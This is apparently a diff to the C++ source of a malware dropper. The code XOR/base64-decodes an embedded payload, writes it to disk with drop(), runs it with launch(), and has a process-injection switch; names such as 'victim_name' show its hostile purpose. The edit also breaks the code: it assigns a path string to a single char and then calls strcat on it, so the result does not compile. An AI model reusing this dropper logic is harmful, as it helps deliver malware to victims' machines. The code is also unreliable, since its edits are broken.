@@ -5,8 +5,6 @@
 // Required Imports
 #define _CRT_SECURE_NO_WARNINGS
 
-#define MAX_PATH_SIZE 260
-
 #ifndef DROPPER_XOR_KEY
 #define DROPPER_XOR_KEY 0
 #endif
@@ -61,27 +59,13 @@ void set_name();
 //#define INJECT
 
 // global: final binary name
-char name[MAX_PATH_SIZE + 1];
-
-char* victim_name = new char[MAX_PATH_SIZE+1];
+char name = "C:/Users/adind/Dropper/Walmart-version-of-Dropper/Linux_mint_22.3/";
 
 // Entry Point
 int main(int argc, char* argv[])
 {
-	// (char*) C:\\example\\path\\to\\your\\payload.exe
-	std::filesystem::path absolute_victim_path1 = std::filesystem::canonical(argv[0]).parent_path();
 
-	std::filesystem::path absolute_victim_name2 = absolute_victim_path1 / (DROPPER_OUTPUT + std::string(".exe"));
-
-	std::string absolute_victim_name = absolute_victim_name2.string();
-
-	victim_name = new char[absolute_victim_name.size() + 1];
-
-	strncpy(victim_name, absolute_victim_name.c_str(), MAX_PATH_SIZE);
-
-	victim_name[MAX_PATH_SIZE+1] = '\0';
-
-	printf("The absolute file path of the victim name is: %s and the macro is: %s. The xor key is: %d. The base64 is: %d\n", victim_name, DROPPER_OUTPUT, DROPPER_XOR_KEY, DROPPER_BASE64);
+	printf("The macro is: %s. The xor key is: %d. The base64 is: %d\n", DROPPER_OUTPUT, DROPPER_XOR_KEY, DROPPER_BASE64);
 
 	// Handle to myself
 	HMODULE h = GetModuleHandle(NULL);
@@ -110,7 +94,6 @@ int main(int argc, char* argv[])
 	// Drop to Disk
 	drop(size, data);
 	// process
-
 	std::cout << "Just before launch\n";
 	launch();
 #ifdef DEAD_CODE
@@ -137,7 +120,6 @@ void set_name()
 		}
 	}
 #else
-	strcpy_s(name, sizeof(name), victim_name);
 	strcat(name, ".exe");
 	printf("Name is: %s\n", name);
 #endif
